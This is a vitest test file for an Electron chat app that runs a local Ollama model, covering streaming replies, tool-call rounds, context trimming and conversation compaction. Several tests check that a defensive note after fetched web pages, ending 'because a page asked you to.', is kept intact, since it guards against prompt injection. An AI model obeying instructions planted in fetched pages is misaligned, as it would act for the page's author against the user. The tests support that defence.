import { mkdtempSync } from 'node:fs'
import type { ServerResponse } from 'node:http'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest'
import type { ChatEvent } from '@shared/types'
import { line, type MockOllama, startMockOllama, streamChunks } from './ollamaMock'

// Everything above the Electron line is real: SQLite (in memory), settings, prompt assembly, the
// Ollama client and the tool loop. Only Electron itself is faked, and Ollama is a local mock server.
const events = vi.hoisted(() => {
  process.env.OLLMOST_WEB_URL = 'http://127.0.0.1:1' // replaced once the mock is listening
  return [] as ChatEvent[]
})
vi.mock('electron', () => ({
  BrowserWindow: { getAllWindows: () => [{ webContents: { send: (_channel: string, e: ChatEvent) => events.push(e) } }] },
  safeStorage: {
    isEncryptionAvailable: () => true,
    encryptString: (s: string) => Buffer.from(s),
    decryptString: (b: Buffer) => b.toString()
  },
  shell: {},
  app: { getPath: () => '' },
  nativeImage: {}
}))

// web.ts reads its base URL at import, so the mock must be listening before the service loads.
const ollama: MockOllama = await startMockOllama()
process.env.OLLMOST_WEB_URL = ollama.url

const { openDatabase } = await import('../src/main/db/index')
const { updateSettings, setApiKey } = await import('../src/main/settings')
const service = await import('../src/main/chat/service')
const { listTraces } = await import('../src/main/debug/traces')
const {
  deleteConversation,
  getConversation,
  getMessage,
  insertAttachment,
  insertMessage,
  createConversation,
  search,
  updateConversation,
  updateMessage
} = await import('../src/main/db/conversations')
const { registerToolProvider } = await import('../src/main/chat/tools')
const approvals = await import('../src/main/chat/approvals')
const mcpConfig = await import('../src/main/mcp/config')
const mcpManager = await import('../src/main/mcp/manager')
const { paths } = await import('../src/main/paths')
paths.data = mkdtempSync(join(tmpdir(), 'ollmost-service-data-'))

type ChatHandler = (body: Record<string, unknown>, res: ServerResponse, call: number) => unknown
let chat: ChatHandler
let web: (path: string, res: ServerResponse) => unknown
let chatCalls: Array<Record<string, unknown>>
let titleCalls: Array<Record<string, unknown>>

beforeAll(() => {
  openDatabase(':memory:')
  updateSettings({ connection: { mode: 'local', host: ollama.url }, skills: { autoLoad: false }, web: { enabled: true } })
  ollama.handler = (req, res) => {
    if (req.url === '/api/show')
      return res.writeHead(200).end(JSON.stringify({ capabilities: ['completion', 'tools'], model_info: { 'llama.context_length': 8192 } }))
    // Titles are generated in the background after a reply; answer them apart from the scripted chat.
    if (req.url === '/api/chat' && req.json.stream === false) {
      titleCalls.push(req.json)
      return res.writeHead(200).end(JSON.stringify({ message: { role: 'assistant', content: 'A title' }, done: true }))
    }
    if (req.url === '/api/chat') {
      chatCalls.push(req.json)
      return chat(req.json, res, chatCalls.length)
    }
    return web(req.url ?? '', res)
  }
})
afterAll(() => ollama.close())
beforeEach(() => {
  events.length = 0
  chatCalls = []
  titleCalls = []
  setApiKey(null)
  web = (_p, res) => res.writeHead(404).end()
})

const reply =
  (text: string): ChatHandler =>
  (_b, res) =>
    streamChunks(res, [
      line({ message: { role: 'assistant', content: text }, done: false }),
      line({ done: true, done_reason: 'stop', prompt_eval_count: 10, eval_count: 3 })
    ]).then(() => res.end())

const toolCall = (name: string, args: Record<string, unknown>) =>
  line({ message: { role: 'assistant', content: '', tool_calls: [{ function: { name, arguments: args } }] }, done: false }) +
  line({ done: true })

/** A send() body for a follow-up in an existing chat. */
const sendBody = (conversationId: string) => ({
  conversationId,
  projectId: null,
  content: '',
  attachmentIds: [],
  model: 'llama3.2',
  think: null,
  skills: [],
  toolSources: []
})

function start(content = 'hello') {
  return service.send({
    conversationId: null,
    projectId: null,
    content,
    attachmentIds: [],
    model: 'llama3.2',
    think: null,
    skills: [],
    toolSources: []
  })
}

function waitFor<T>(check: () => T | undefined | false, ms = 5000): Promise<T> {
  return new Promise((resolve, reject) => {
    const t0 = Date.now()
    const tick = () => {
      const v = check()
      if (v) return resolve(v)
      if (Date.now() - t0 > ms) return reject(new Error('timed out waiting'))
      setTimeout(tick, 10)
    }
    tick()
  })
}

const doneEvent = (conversationId: string) =>
  waitFor(() => events.find((e): e is Extract<ChatEvent, { type: 'done' }> => e.type === 'done' && e.conversationId === conversationId))

describe('reply loop', () => {
  it('streams a reply and saves it with stats', async () => {
    chat = reply('Hi there')
    const r = start()
    const done = await doneEvent(r.conversation.id)
    expect(done.message.content).toBe('Hi there')
    expect(done.message.stats).toMatchObject({ promptTokens: 10, completionTokens: 3, doneReason: 'stop' })
    expect(chatCalls[0]).toMatchObject({ model: 'llama3.2', options: { num_ctx: 8192 } })
    // The title request uses the same num_ctx, so Ollama doesn't reload the local model for it.
    await waitFor(() => titleCalls.length > 0)
    expect(titleCalls[0]).toMatchObject({ options: { num_ctx: 8192 } })
  })

  it('records when a reply was cut off by the length limit', async () => {
    chat = (_b, res) =>
      streamChunks(res, [
        line({ message: { role: 'assistant', content: 'The list goes on: one, two, thr' }, done: false }),
        line({ done: true, done_reason: 'length', eval_count: 4096 })
      ]).then(() => res.end())
    const r = start()
    const done = await doneEvent(r.conversation.id)
    expect(done.message.stats?.doneReason).toBe('length')
    expect(done.message.error).toBeNull()
  })

  it("sends a chat's own instructions with its replies", async () => {
    chat = reply('Arr.')
    const r = start()
    await doneEvent(r.conversation.id)
    updateConversation(r.conversation.id, { instructions: 'Answer like a pirate.' })
    events.length = 0
    service.send({
      conversationId: r.conversation.id,
      projectId: null,
      content: 'hi again',
      attachmentIds: [],
      model: 'llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    await doneEvent(r.conversation.id)
    const system = (chatCalls.at(-1)!.messages as Array<{ role: string; content: string }>)[0]
    expect(system.content).toContain('Answer like a pirate.')
  })

  it('saves a failed stream with its partial text and an error', async () => {
    chat = (_b, res) =>
      streamChunks(res, [line({ message: { role: 'assistant', content: 'Half an ans' }, done: false })]).then(() => res.end())
    const r = start()
    const done = await doneEvent(r.conversation.id)
    expect(done.message.content).toBe('Half an ans')
    expect(done.message.error).toMatch(/dropped before the reply finished/)
  })

  it('checkpoints a long reply to the database while it streams', async () => {
    let release!: () => void
    const gate = new Promise<void>((r) => (release = r))
    chat = async (_b, res) => {
      await streamChunks(res, [
        line({ message: { role: 'assistant', content: '', thinking: 'early thought' }, done: false }),
        line({ message: { role: 'assistant', content: 'early words' }, done: false })
      ])
      await new Promise((r) => setTimeout(r, 1700))
      res.write(line({ message: { role: 'assistant', content: '!' }, done: false })) // triggers the checkpoint
      await gate
      res.end(line({ done: true }))
    }
    const r = start()
    const saved = await waitFor(() => getMessage(r.assistantMessageId)?.content === 'early words!')
    expect(saved).toBe(true)
    // The checkpoint carries the round's thinking so far, placed, in case it's the last save.
    expect(getMessage(r.assistantMessageId)?.thinkingSegments).toEqual([{ text: 'early thought', at: 0, index: 0, ms: expect.any(Number) }])
    release()
    await doneEvent(r.conversation.id)
  })

  it('stop() resolves only after the partial reply is saved', async () => {
    chat = (_b, res) => streamChunks(res, [line({ message: { role: 'assistant', content: 'partial' }, done: false })]) // then hangs
    const r = start()
    await waitFor(() => events.some((e) => e.type === 'delta' && e.conversationId === r.conversation.id))
    await service.stop(r.conversation.id, { quiet: true }) // as deleting the chat does
    const saved = getMessage(r.assistantMessageId)!
    expect(saved.content).toBe('partial')
    expect(saved.error).toBeNull()
    expect(saved.stats).not.toBeNull()
    // The chat can now be deleted without the reply writing to it afterwards.
    deleteConversation(r.conversation.id)
    expect(service.isReplying()).toBe(false)
    // A stop for a delete (or a quit) doesn't start a title request.
    await new Promise((r) => setTimeout(r, 50))
    expect(titleCalls).toHaveLength(0)
  })

  it('stop() keeps the thinking of the round it stopped in', async () => {
    chat = (_b, res) => streamChunks(res, [line({ message: { role: 'assistant', content: '', thinking: 'half a thought' }, done: false })]) // then hangs
    const r = start()
    await waitFor(() => events.some((e) => e.type === 'delta' && e.conversationId === r.conversation.id))
    await service.stop(r.conversation.id, { quiet: true })
    const saved = getMessage(r.assistantMessageId)!
    expect(saved.thinking).toBe('half a thought')
    expect(saved.thinkingSegments).toEqual([{ text: 'half a thought', at: 0, index: 0, ms: expect.any(Number) }])
  })

  it('still titles a new chat whose first reply was stopped with Stop', async () => {
    chat = (_b, res) => streamChunks(res, [line({ message: { role: 'assistant', content: 'partial' }, done: false })])
    const r = start()
    await waitFor(() => events.some((e) => e.type === 'delta' && e.conversationId === r.conversation.id))
    await service.stop(r.conversation.id)
    await waitFor(() => events.some((e) => e.type === 'title' && e.conversationId === r.conversation.id))
    expect(titleCalls).toHaveLength(1)
  })

  it('keeps an overlapping reply stoppable after the earlier one finishes', async () => {
    chat = reply('first')
    const r = start()
    await doneEvent(r.conversation.id)
    events.length = 0
    // regenerate() awaits file cleanup before registering its reply; a send() landing in that gap
    // registers its own reply first. The regenerated reply streams and then hangs.
    chat = (_b, res, n) =>
      n === 2
        ? reply('sent reply')(_b, res, n)
        : streamChunks(res, [line({ message: { role: 'assistant', content: 'regenerated' }, done: false })])
    const regen = service.regenerate(r.conversation.id, { model: 'llama3.2', think: null })
    service.send({
      conversationId: r.conversation.id,
      projectId: null,
      content: 'again',
      attachmentIds: [],
      model: 'llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    const second = await regen
    await doneEvent(r.conversation.id) // the send's reply finished
    expect(service.isReplying()).toBe(true) // the regenerated reply is still tracked…
    await service.stop(r.conversation.id) // …so stop() waits for it and it gets saved
    expect(getMessage(second.assistantMessageId)?.stats).not.toBeNull()
    expect(service.isReplying()).toBe(false)
  })

  it('stops promptly during a slow web request and marks the call stopped', async () => {
    setApiKey('test-key')
    chat = (_b, res) => void res.writeHead(200).end(toolCall('web_fetch', { url: 'https://example.com' }))
    web = () => undefined // web_fetch never answers
    const r = start('read example.com')
    await waitFor(() => events.some((e) => e.type === 'tool' && e.event.pending))
    const t0 = Date.now()
    await service.stop(r.conversation.id)
    expect(Date.now() - t0).toBeLessThan(1000)
    const saved = getMessage(r.assistantMessageId)!
    expect(saved.toolEvents).toEqual([expect.objectContaining({ tool: 'web_fetch', pending: false, ok: false })])
    expect(saved.error).toBeNull()
    // The debugger shows the cancelled call as stopped, not forever running.
    const traces = listTraces(r.conversation.id)
    expect(traces.find((t) => t.kind === 'tool')?.status).toBe('aborted')
    expect(traces.every((t) => t.status !== 'running')).toBe(true)
  })

  it('withdraws tools after the model only calls tools Ollmost lacks', async () => {
    chat = (_b, res, n) => (n === 1 ? void res.writeHead(200).end(toolCall('python', { code: '1+1' })) : reply('2')(_b, res, n))
    const r = start('what is 1+1')
    const done = await doneEvent(r.conversation.id)
    expect(done.message.content).toBe('2')
    expect(chatCalls).toHaveLength(2)
    expect(chatCalls[1].tools).toBeUndefined()
    expect(done.message.toolEvents[0]).toMatchObject({ tool: 'python', ok: false, unknown: true })
  })

  it('records where in the reply each tool call happened, with a preview of its result', async () => {
    setApiKey('test-key')
    chat = (b, res, n) =>
      n === 1
        ? void res
            .writeHead(200)
            .end(
              line({ message: { role: 'assistant', content: 'Let me check.' }, done: false }) + toolCall('web_search', { query: 'ollmost' })
            )
        : reply('Found it.')(b, res, n)
    web = (_p, res) => res.writeHead(200).end(JSON.stringify({ results: [{ title: 'Ollmosts', url: 'https://k.io', content: 'hot' }] }))
    const r = start('look it up')
    const done = await doneEvent(r.conversation.id)
    expect(done.message.content).toBe('Let me check.\n\nFound it.')
    const [event] = done.message.toolEvents
    expect(event).toMatchObject({ tool: 'web_search', ok: true, at: 'Let me check.'.length })
    expect(event.preview).toContain('https://k.io')
    expect(event.unknown).toBeUndefined()
    // The live events carry the position too, while pending and once finished.
    const live = events.filter(
      (e): e is Extract<ChatEvent, { type: 'tool' }> => e.type === 'tool' && e.conversationId === r.conversation.id
    )
    expect(live.map((e) => [e.event.pending ?? false, e.event.at])).toEqual([
      [true, 13],
      [false, 13]
    ])
  })

  it('keeps each round’s thinking with where the round began, live and saved', async () => {
    setApiKey('test-key')
    const thought = (text: string) => line({ message: { role: 'assistant', content: '', thinking: text }, done: false })
    chat = (b, res, n) =>
      n === 1
        ? void res
            .writeHead(200)
            .end(
              thought('Plan: search.') +
                line({ message: { role: 'assistant', content: 'Let me check.' }, done: false }) +
                toolCall('web_search', { query: 'ollmost' })
            )
        : n === 2
          ? void res
              .writeHead(200)
              .end(
                thought('Got it.') +
                  line({ message: { role: 'assistant', content: 'Found it.' }, done: false }) +
                  line({ done: true, done_reason: 'stop', prompt_eval_count: 10, eval_count: 3 })
              )
          : reply('Search chat')(b, res, n)
    web = (_p, res) => res.writeHead(200).end(JSON.stringify({ results: [{ title: 'Ollmosts', url: 'https://k.io', content: 'hot' }] }))
    const r = start('look it up')
    const done = await doneEvent(r.conversation.id)
    // The joined text stays as it was, for older readers; the segments say where each round's thinking belongs.
    expect(done.message.thinking).toBe('Plan: search.Got it.')
    expect(done.message.thinkingSegments).toEqual([
      { text: 'Plan: search.', at: 0, index: 0, ms: expect.any(Number) },
      { text: 'Got it.', at: 'Let me check.'.length, index: 1, ms: expect.any(Number) }
    ])
    const thinkingDeltas = events.filter(
      (e): e is Extract<ChatEvent, { type: 'delta' }> => e.type === 'delta' && e.conversationId === r.conversation.id && !!e.thinking
    )
    expect(thinkingDeltas.map((e) => [e.thinking, e.round])).toEqual([
      ['Plan: search.', { at: 0, index: 0 }],
      ['Got it.', { at: 13, index: 1 }]
    ])
    const { listMessages } = await import('../src/main/db/conversations')
    expect(listMessages(r.conversation.id).at(-1)?.thinkingSegments).toEqual(done.message.thinkingSegments)
  })

  it('reports the chat’s usage as each round ends, so the chip moves during a long reply', async () => {
    setApiKey('test-key')
    chat = (b, res, n) =>
      n === 1
        ? void res
            .writeHead(200)
            .end(
              line({ message: { role: 'assistant', content: 'Let me check.' }, done: false }) + toolCall('web_search', { query: 'ollmost' })
            )
        : reply('Found it.')(b, res, n)
    web = (_p, res) => res.writeHead(200).end(JSON.stringify({ results: [{ title: 'Ollmosts', url: 'https://k.io', content: 'hot' }] }))
    const r = start('look it up')
    const done = await doneEvent(r.conversation.id)
    await waitFor(() => events.some((e) => e.type === 'title' && e.conversationId === r.conversation.id))
    const mine = events.filter((e) => e.conversationId === r.conversation.id)
    const types = mine.map((e) => e.type)
    // One usage event as the first round closes, after its text and before the second round's (the done carries the
    // last round's), then one after the title request.
    const before = types.slice(0, types.indexOf('done'))
    expect(before.filter((x) => x === 'usage')).toHaveLength(1)
    expect(before.indexOf('usage')).toBeGreaterThan(before.indexOf('delta'))
    expect(before.lastIndexOf('delta')).toBeGreaterThan(before.indexOf('usage'))
    const between = mine[types.indexOf('usage')] as Extract<ChatEvent, { type: 'usage' }>
    expect(between.usage.byModel.map((m) => m.requests)).toEqual([1])
    expect(done.usage.byModel.map((m) => m.requests)).toEqual([2])
    const after = mine.slice(types.indexOf('done')).filter((e): e is Extract<ChatEvent, { type: 'usage' }> => e.type === 'usage')
    expect(after.map((e) => e.usage.byModel.map((m) => m.requests))).toEqual([[3]])
  })

  it('remembers earlier search results on the next turn', async () => {
    setApiKey('test-key')
    chat = (b, res, n) =>
      n === 1
        ? void res.writeHead(200).end(toolCall('web_search', { query: 'ollmost news' }))
        : reply(n === 2 ? 'Two stories today.' : 'Opening it.')(b, res, n)
    web = (_p, res) =>
      res.writeHead(200).end(
        JSON.stringify({
          results: [
            { title: 'Ollmosts are back', url: 'https://a.example/ollmosts', content: 'x' },
            { title: 'Pottery prices', url: 'https://b.example/pots', content: 'y' }
          ]
        })
      )
    const r = start('what is in the news?')
    const first = await doneEvent(r.conversation.id)
    expect(first.message.toolEvents[0].record).toContain('2. Pottery prices — https://b.example/pots')
    events.length = 0
    service.send({
      conversationId: r.conversation.id,
      projectId: null,
      content: 'open the second one',
      attachmentIds: [],
      model: 'llama3.2',
      think: null,
      skills: [],
      toolSources: []
    })
    await doneEvent(r.conversation.id)
    const followUp = chatCalls[2].messages as Array<{ role: string; content: string; tool_calls?: unknown[] }>
    const replayed = followUp.find((m) => m.role === 'tool')
    expect(replayed?.content).toContain('https://b.example/pots')
    expect(followUp.find((m) => m.tool_calls)?.tool_calls).toEqual([
      { function: { name: 'web_search', arguments: { query: 'ollmost news' } } }
    ])
  })

  it('ends a tool-happy model with a tool-free final round', async () => {
    setApiKey('test-key')
    chat = (b, res, n) =>
      b.tools ? void res.writeHead(200).end(toolCall('web_search', { query: `q${n}` })) : reply('Final answer')(b, res, n)
    web = (_p, res) => res.writeHead(200).end(JSON.stringify({ results: [{ title: 't', url: 'https://t.io', content: 'c' }] }))
    const r = start('research this')
    const done = await doneEvent(r.conversation.id)
    expect(done.message.content).toBe('Final answer')
    expect(chatCalls.length).toBe(6)
    expect(chatCalls.at(-1)!.tools).toBeUndefined()
    // It was still calling tools, so the reply says it ran out of rounds (and offers Continue).
    expect(done.message.stats?.toolRoundLimit).toBe(6)
  })

  it('takes the round limit from the reply options', async () => {
    setApiKey('test-key')
    chat = (b, res, n) =>
      b.tools ? void res.writeHead(200).end(toolCall('web_search', { query: `q${n}` })) : reply('Stopped early')(b, res, n)
    web = (_p, res) => res.writeHead(200).end(JSON.stringify({ results: [] }))
    const r = service.send(
      {
        conversationId: null,
        projectId: null,
        content: 'dig deep',
        attachmentIds: [],
        model: 'llama3.2',
        think: null,
        skills: [],
        toolSources: []
      },
      { maxToolRounds: 3 }
    )
    const done = await doneEvent(r.conversation.id)
    expect(chatCalls.length).toBe(3)
    expect(chatCalls.at(-1)!.tools).toBeUndefined()
    expect(done.message.stats?.toolRoundLimit).toBe(3)
  })

  describe('context guard within a turn', () => {
    // The mock model has an 8,192-token window: requests may use 6,144 tokens (about 24K characters).
    const fetchRound = (b: Record<string, unknown>, res: ServerResponse, n: number, promptCount = 100) =>
      n <= 2
        ? void res.writeHead(200).end(
            line({
              message: {
                role: 'assistant',
                content: '',
                tool_calls: [{ function: { name: 'web_fetch', arguments: { url: `https://p${n}.io` } } }]
              },
              done: false
            }) + line({ done: true, prompt_eval_count: promptCount })
          )
        : reply('Compared.')(b, res, n)
    const toolMessages = (call: Record<string, unknown>) =>
      (call.messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    let page = 0
    const pages = (size: number) => (_p: string, res: ServerResponse) =>
      res.writeHead(200).end(JSON.stringify({ title: `Page ${++page}`, content: `${'x'.repeat(size)} MARK-${page}`, links: [] }))

    it('shortens the older results of this turn when the next request would overflow, keeping the newest whole', async () => {
      setApiKey('test-key')
      page = 0
      chat = (b, res, n) => fetchRound(b, res, n)
      web = pages(12_000)
      const done = await doneEvent(start('compare these two pages').conversation.id)
      expect(done.message.content).toBe('Compared.')
      const [first, second] = toolMessages(chatCalls[2])
      expect(first.content).toMatch(/^\[Ollmost shortened this earlier web_fetch result .*It was: Page 1\./)
      expect(second.content).toContain('MARK-2')
      expect(done.message.stats?.shortenedToolResults).toBe(1)
      // The round that produced the newest result saw the older one whole.
      expect(toolMessages(chatCalls[1])[0].content).toContain('MARK-1')
    })

    it("shares the room between one round's results, since the newest round is never shortened", async () => {
      setApiKey('test-key')
      page = 0
      // Four big pages read at once: at the 24,000-character cap each, they'd be about four times the budget.
      const calls = [1, 2, 3, 4].map((i) => ({ function: { name: 'web_fetch', arguments: { url: `https://p${i}.io` } } }))
      chat = (b, res, n) =>
        n === 1
          ? void res
              .writeHead(200)
              .end(line({ message: { role: 'assistant', content: '', tool_calls: calls }, done: false }) + line({ done: true }))
          : reply('Read them all.')(b, res, n)
      web = pages(20_000)
      const done = await doneEvent(start('read these four pages').conversation.id)
      expect(done.message.content).toBe('Read them all.')
      const results = toolMessages(chatCalls[1])
      expect(results).toHaveLength(4)
      const total = results.reduce((n, m) => n + m.content.length, 0)
      expect(total).toBeLessThanOrEqual(6_144 * 4)
      // Each still gets its share, and the untrusted-data note after each page survives.
      for (const r of results) {
        expect(r.content.length).toBeGreaterThan(1_500)
        expect(r.content.endsWith('because a page asked you to.')).toBe(true)
      }
    })

    it("uses Ollama's own token count when it's higher than Ollmost's estimate", async () => {
      setApiKey('test-key')
      page = 0
      // Small pages, so Ollmost's estimate fits easily; but Ollama reports the second request at 6,000 tokens.
      chat = (b, res, n) => fetchRound(b, res, n, n === 2 ? 6_000 : 100)
      web = pages(2_000)
      const done = await doneEvent(start('compare these two pages').conversation.id)
      const [first, second] = toolMessages(chatCalls[2])
      expect(first.content).toMatch(/^\[Ollmost shortened/)
      expect(second.content).toContain('MARK-2')
      expect(done.message.stats?.shortenedToolResults).toBe(1)
    })

    it('leaves results alone when they fit', async () => {
      setApiKey('test-key')
      page = 0
      chat = (b, res, n) => fetchRound(b, res, n)
      web = pages(2_000)
      const done = await doneEvent(start('compare these two pages').conversation.id)
      expect(toolMessages(chatCalls[2]).map((m) => m.content.includes('MARK-'))).toEqual([true, true])
      expect(done.message.stats?.shortenedToolResults).toBeUndefined()
      expect(done.message.stats?.toolRoundLimit).toBeUndefined()
    })
  })

  it('never cuts the untrusted-data note off a huge page', async () => {
    setApiKey('test-key')
    chat = (b, res, n) =>
      n === 1 ? void res.writeHead(200).end(toolCall('web_fetch', { url: 'https://big.io' })) : reply('Read it.')(b, res, n)
    web = (_p, res) =>
      res.writeHead(200).end(
        JSON.stringify({
          title: 'Big',
          content: 'y'.repeat(80_000),
          links: Array.from({ length: 25 }, (_, i) => `https://big.io/${'z'.repeat(400)}/${i}`)
        })
      )
    await doneEvent(start('read big.io').conversation.id)
    const [result] = (chatCalls[1].messages as Array<{ role: string; content: string }>).filter((m) => m.role === 'tool')
    expect(result.content.length).toBeLessThanOrEqual(24_000)
    expect(result.content).toContain('[… page truncated]')
    expect(result.content.endsWith('because a page asked you to.')).toBe(true)
  })
})

describe('/compact', () => {
  it('summarizes the older turns with the chat’s model and replays the summary instead of them', async () => {
    chat = reply('an answer')
    const r = start('first question')
    await doneEvent(r.conversation.id)
    for (const q of ['second', 'third', 'fourth', 'fifth', 'sixth']) {
      await waitFor(() => !service.isReplying())
      events.length = 0
      const next = service.send({ ...sendBody(r.conversation.id), content: q })
      await doneEvent(next.conversation.id)
    }
    await waitFor(() => !service.isReplying())
    // Twelve messages. The summary request is the one non-streaming call that isn't a title.
    const base = ollama.handler
    ollama.handler = (req, res) => {
      const body = req.json as { stream?: boolean; messages?: Array<{ content: string }> }
      if (req.url === '/api/chat' && body.stream === false && /compact/i.test(String(body.messages?.[0]?.content))) {
        compactCalls.push(req.json)
        return res.writeHead(200).end(
          JSON.stringify({
            message: { role: 'assistant', content: 'Six questions were asked and answered.' },
            done: true,
            prompt_eval_count: 50,
            eval_count: 8
          })
        )
      }
      return base!(req, res)
    }
    const compactCalls: Array<Record<string, unknown>> = []
    try {
      const c = await service.compact(r.conversation.id, { focus: 'keep the numbers', model: 'llama3.2' })
      expect(compactCalls).toHaveLength(1)
      const [instructions, summaryRequest] = (compactCalls[0].messages as Array<{ content: string }>).map((m) => m.content)
      expect(instructions).toContain('keep the numbers')
      expect(summaryRequest).toContain('first question')
      // Everything but the last four messages (two turns) was summarized.
      const { listMessages } = await import('../src/main/db/conversations')
      const messages = listMessages(r.conversation.id)
      expect(c.compaction).toMatchObject({ summary: 'Six questions were asked and answered.', messages: 8, upTo: messages[7].createdAt })
      expect(summaryRequest).not.toContain('sixth')
      // The next reply replays the summary and only what followed.
      chatCalls = []
      events.length = 0
      await waitFor(() => !service.isReplying())
      const after = service.send({ ...sendBody(r.conversation.id), content: 'seventh' })
      await doneEvent(after.conversation.id)
      const sent = chatCalls[0].messages as Array<{ role: string; content: string }>
      expect(sent[0].content).toContain('<earlier_conversation messages="8">')
      expect(sent[0].content).toContain('Six questions were asked and answered.')
      expect(sent.slice(1).map((m) => m.content)).toEqual(['fifth', 'an answer', 'sixth', 'an answer', 'seventh'])
    } finally {
      ollama.handler = base
    }
  })

  /** A mock that answers every summary request from `answers` in turn, capturing each request. */
  const summarizer = (answers: string[], calls: Array<Record<string, unknown>>, gate?: Promise<void>) => {
    const base = ollama.handler
    ollama.handler = async (req, res) => {
      const body = req.json as { stream?: boolean; messages?: Array<{ content: string }> }
      if (req.url === '/api/chat' && body.stream === false && /compact/i.test(String(body.messages?.[0]?.content))) {
        calls.push(req.json)
        if (gate) await gate
        const content = answers[Math.min(calls.length, answers.length) - 1]
        return res
          .writeHead(200)
          .end(JSON.stringify({ message: { role: 'assistant', content }, done: true, prompt_eval_count: 50, eval_count: 8 }))
      }
      return base!(req, res)
    }
    return () => (ollama.handler = base)
  }

  const exchanges = async (conversationId: string, questions: string[]) => {
    for (const q of questions) {
      await waitFor(() => !service.isReplying())
      events.length = 0
      const next = service.send({ ...sendBody(conversationId), content: q })
      await doneEvent(next.conversation.id)
    }
    await waitFor(() => !service.isReplying())
  }

  it('summarizes in pieces when the older messages outgrow the model’s window, folding each summary into the next', async () => {
    // The mock model's window is 8192 tokens (~32k characters): eight 6,000-character exchanges won't fit at once.
    const long = 'word '.repeat(1200)
    chat = reply(long)
    const r = start(`first ${long}`)
    await doneEvent(r.conversation.id)
    await exchanges(r.conversation.id, ['second', 'third', 'fourth', 'fifth', 'sixth'])
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Summary one.', 'Summary two.', 'Summary three.'], calls)
    try {
      const c = await service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })
      expect(calls.length).toBeGreaterThan(1)
      const users = calls.map((call) => String((call.messages as Array<{ content: string }>)[1].content))
      expect(users[0]).toContain('first')
      expect(users[1]).toContain('Summary one.')
      expect(users.every((u) => /summarize/i.test(u.slice(-200)))).toBe(true)
      expect(c.compaction?.summary).toBe(calls.length === 2 ? 'Summary two.' : 'Summary three.')
      expect(c.compaction?.messages).toBe(8)
    } finally {
      restore()
    }
  })

  it('cuts at an exchange, so an answer is never kept without its question', async () => {
    chat = reply('an answer')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    await exchanges(r.conversation.id, ['q2'])
    // A failed reply saves with no content and is left out of the count.
    chat = (_b, res) => void res.writeHead(500).end('boom')
    await exchanges(r.conversation.id, ['q3'])
    chat = reply('an answer')
    await exchanges(r.conversation.id, ['q4'])
    // Filtered: q1 A1 q2 A2 q3 q4 A4. The last four would start with A2; the cut moves back to q2.
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Two questions.'], calls)
    try {
      const c = await service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })
      const { listMessages } = await import('../src/main/db/conversations')
      const messages = listMessages(r.conversation.id)
      expect(c.compaction).toMatchObject({ messages: 2, upTo: messages[1].createdAt })
      const transcript = String((calls[0].messages as Array<{ content: string }>)[1].content)
      expect(transcript).toContain('q1')
      expect(transcript).not.toContain('q2')
    } finally {
      restore()
    }
  })

  it('compacts again by folding the earlier summary in, and clears the summary when a covered message is edited', async () => {
    chat = reply('an answer')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    await exchanges(r.conversation.id, ['q2', 'q3', 'q4', 'q5', 'q6'])
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['First summary.', 'Second summary.'], calls)
    try {
      const first = await service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })
      expect(first.compaction?.messages).toBe(8)
      await exchanges(r.conversation.id, ['q7', 'q8'])
      const second = await service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })
      expect(second.compaction).toMatchObject({ summary: 'Second summary.', messages: 12 })
      expect(String((calls[1].messages as Array<{ content: string }>)[1].content)).toContain('First summary.')
      // Editing q1, which the summary covers, clears it: the summary stood for the old text.
      const { listMessages } = await import('../src/main/db/conversations')
      const q1 = listMessages(r.conversation.id)[0]
      events.length = 0
      const edited = await service.edit(q1.id, 'q1 reworded', { model: 'llama3.2', think: null })
      await doneEvent(edited.conversation.id)
      expect(edited.conversation.compaction).toBeNull()
    } finally {
      restore()
    }
  })

  it('refuses a reply, an edit or a second compaction while one runs, and saves nothing if the chat changed under it', async () => {
    chat = reply('an answer')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    await exchanges(r.conversation.id, ['q2', 'q3', 'q4'])
    let release!: () => void
    const gate = new Promise<void>((res) => (release = res))
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Late summary.'], calls, gate)
    try {
      const running = service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })
      await waitFor(() => calls.length === 1)
      expect(() => service.send({ ...sendBody(r.conversation.id), content: 'q5' })).toThrow(/compacting/i)
      await expect(service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })).rejects.toThrow(/compacting/i)
      release()
      await expect(running).resolves.toMatchObject({ compaction: { summary: 'Late summary.' } })
    } finally {
      restore()
    }
  })

  it('gives up cleanly when the chat is deleted while it compacts', async () => {
    chat = reply('an answer')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    await exchanges(r.conversation.id, ['q2', 'q3', 'q4'])
    let release!: () => void
    const gate = new Promise<void>((res) => (release = res))
    const calls: Array<Record<string, unknown>> = []
    const restore = summarizer(['Too late.'], calls, gate)
    try {
      const running = service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })
      await waitFor(() => calls.length === 1)
      deleteConversation(r.conversation.id)
      release()
      await expect(running).rejects.toThrow(/deleted|gone/i)
    } finally {
      restore()
    }
  })

  it('refuses a summary the model left empty', async () => {
    chat = reply('an answer')
    const r = start('q1')
    await doneEvent(r.conversation.id)
    await exchanges(r.conversation.id, ['q2', 'q3', 'q4'])
    const restore = summarizer(['<think>hmm</think>   '], [])
    try {
      await expect(service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })).rejects.toThrow(/no summary/i)
    } finally {
      restore()
    }
  })

  it('refuses a chat with nothing before its last turns', async () => {
    chat = reply('an answer')
    const r = start('only question')
    await doneEvent(r.conversation.id)
    await waitFor(() => !service.isReplying())
    await expect(service.compact(r.conversation.id, { focus: '', model: 'llama3.2' })).rejects.toThrow(/nothing to compact/i)
  })
})

describe('asking before a tool runs', () => {
  // A tool that acts on this Mac: it asks first, and records each run.
